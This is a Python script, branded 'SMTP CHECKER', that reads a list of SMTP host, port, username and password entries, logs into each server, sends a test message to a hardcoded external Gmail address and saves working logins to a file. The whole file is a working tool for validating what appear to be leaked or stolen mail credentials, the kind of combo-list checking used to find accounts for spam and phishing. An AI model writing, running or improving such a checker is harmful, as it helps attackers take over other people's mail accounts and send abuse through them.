from smtplib import SMTP
from colorama import init, Fore, Back, Style
from pyfiglet import Figlet
from os import system
import time
from threading import Thread, Event
import sys

# Initialize colorama with autoreset
init(autoreset=True)

system('cls')

# Global variables
credential = {}
email = 'crax6ix@gmail.com'
output = r'success.txt'

def print_banner():
    """Display a colorful ASCII art banner for the SMTP Checker"""
    f = Figlet(font='slant')  
    banner_text = f.renderText('SMTP CHECKER')
    
    print(Fore.RED + banner_text)
    print(Fore.CYAN + "-" * 70)
    print(Fore.LIGHTWHITE_EX + "Developed by 0xAbolfazl".center(70))
    print(Fore.CYAN + "-" * 70 + "\n")

def extract_credential(filepath):
    """Extract credentials from file with colorful feedback"""
    try:
        with open(filepath, 'r') as file:
            file_data = file.readlines()
            try:
                for index, item in enumerate(file_data):
                    item = item.strip()
                    if item:
                        parts = item.split('|')
                        if len(parts) == 4:
                            credential[index] = {
                                'host': parts[0],
                                'port': parts[1],
                                'username': parts[2],
                                'password': parts[3]
                            }
                        else:
                            print(Fore.LIGHTYELLOW_EX + f"[!] Malformed line {index+1}: {item[:20]}...")
            except Exception as e:
                print(Fore.LIGHTRED_EX + "\n[✗] " + Back.LIGHTBLACK_EX + " ERROR: " + Style.RESET_ALL)
                print(Fore.LIGHTYELLOW_EX + f"Invalid data format!\nExpected: HOST|PORT|USERNAME|PASSWORD\nError: {str(e)}")
    except Exception as e:
        print(Fore.LIGHTRED_EX + "\n[✗] " + Back.LIGHTBLACK_EX + " FILE ERROR: " + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + f"Can't open file: {str(e)}")

def check_smtp(credential):
    """Check SMTP with animated loading and creative output"""
    USERNAME = credential['username']
    PASSWORD = credential['password']
    HOST = credential['host']
    PORT = credential['port']
    
    # Animation control
    stop_event = Event()
    result = {'success': False, 'error': None, 'time': 0}
    
    # Animation thread
    def animation():
        animations = ["⣾ ","⣽ ","⣻ ","⢿ ","⡿ ","⣟ ","⣯ ","⣷ "]
        print(Fore.LIGHTBLUE_EX + f"\nChecking {HOST}:{PORT}... ", end='', flush=True)
        while not stop_event.is_set():
            for anim in animations:
                if stop_event.is_set():
                    break
                print(Fore.LIGHTBLUE_EX + f"\rChecking {HOST}:{PORT} {anim}", end='', flush=True)
                time.sleep(0.1)
    
    # SMTP check thread
    def smtp_checker():
        start_time = time.time()
        try:
            with SMTP(HOST, int(PORT), timeout=10) as smtp_server:
                smtp_server.starttls()
                smtp_server.login(user=USERNAME, password=PASSWORD)
                smtp_server.sendmail(
                    from_addr=credential['username'], 
                    to_addrs=email, 
                    msg="SMTP Checker Test"
                )
            result['success'] = True
            result['time'] = time.time() - start_time
        except Exception as e:
            result['error'] = str(e)
        finally:
            stop_event.set()
    
    # Start both threads
    animation_thread = Thread(target=animation)
    checker_thread = Thread(target=smtp_checker)
    
    animation_thread.start()
    checker_thread.start()
    
    # Wait for completion
    checker_thread.join()
    animation_thread.join()
    
    # Clear animation line
    print("\r" + " " * (len(f"Checking {HOST}:{PORT} ⣷ ") + 10), end='\r')
    
    # Display results
    if result['success']:
        elapsed_time = result['time']
        print(Fore.LIGHTGREEN_EX + "\n╔" + "═" * 78 + "╗")

        print(Fore.LIGHTGREEN_EX + "║" + Fore.LIGHTWHITE_EX + " ✓ VALID CREDENTIAL ".center(78, '-') + Fore.LIGHTGREEN_EX + "║")
        print(Fore.LIGHTGREEN_EX + "╠" + "═" * 78 + "╣")
        print(Fore.LIGHTGREEN_EX + "║ " + Fore.LIGHTCYAN_EX + f"Host: {HOST}".ljust(77) + Fore.LIGHTGREEN_EX + "║")
        print(Fore.LIGHTGREEN_EX + "║ " + Fore.LIGHTCYAN_EX + f"Port: {PORT}".ljust(77) + Fore.LIGHTGREEN_EX + "║")
        print(Fore.LIGHTGREEN_EX + "║ " + Fore.LIGHTCYAN_EX + f"User: {USERNAME}".ljust(77) + Fore.LIGHTGREEN_EX + "║")
        print(Fore.LIGHTGREEN_EX + "║ " + Fore.LIGHTCYAN_EX + f"Time: {elapsed_time:.2f}s".ljust(77) + Fore.LIGHTGREEN_EX + "║")
        print(Fore.LIGHTGREEN_EX + "╚" + "═" * 78 + "╝")
        
        with open(output, 'a') as file:
            file.write(f'{HOST}|{PORT}|{USERNAME}|{PASSWORD}\n')
    else:
        error_msg = result['error'][:75] if result['error'] else "Unknown error"
        print(Fore.LIGHTRED_EX + "\n╔" + "═" * 78 + "╗")
        print(Fore.LIGHTRED_EX + "║" + Fore.LIGHTWHITE_EX + " ✗ INVALID CREDENTIAL ".center(78, '-') + Fore.LIGHTRED_EX + "║")
        print(Fore.LIGHTRED_EX + "╠" + "═" * 78 + "╣")
        print(Fore.LIGHTRED_EX + "║ " + Fore.LIGHTYELLOW_EX + f"Error: {error_msg}".ljust(77) + Fore.LIGHTRED_EX + "║")
        print(Fore.LIGHTRED_EX + "╚" + "═" * 78 + "╝")

def main():
    """Main function with creative interface"""
    print_banner()
    # Get input with colorful prompt
    input_file = input(Fore.LIGHTCYAN_EX + "[?] " + Fore.LIGHTWHITE_EX + 
                     "Enter credentials file path: " + Fore.LIGHTYELLOW_EX)
    
    extract_credential(input_file)
    
    if not credential:
        print(Fore.LIGHTRED_EX + "\n[✗] " + Back.LIGHTBLACK_EX + " NO CREDENTIALS FOUND " + Style.RESET_ALL)
        return
    
    print(Fore.LIGHTMAGENTA_EX + "\n#" + f" Checking {len(credential)} credentials ".center(38, '#') + "#")
    
    for i in credential.values():
        check_smtp(i)
    
    # Creative completion message
    print(Fore.LIGHTMAGENTA_EX + "\n" + "#" * 40)
    print(Fore.LIGHTGREEN_EX + "✓ " + Fore.LIGHTWHITE_EX + "Operation completed".center(36) + 
          Fore.LIGHTGREEN_EX + " ✓")
    print(Fore.LIGHTMAGENTA_EX + "#" * 40)
    print(Fore.LIGHTCYAN_EX + "Results saved to: " + Fore.LIGHTYELLOW_EX + output)

if __name__ == "__main__":
    main()
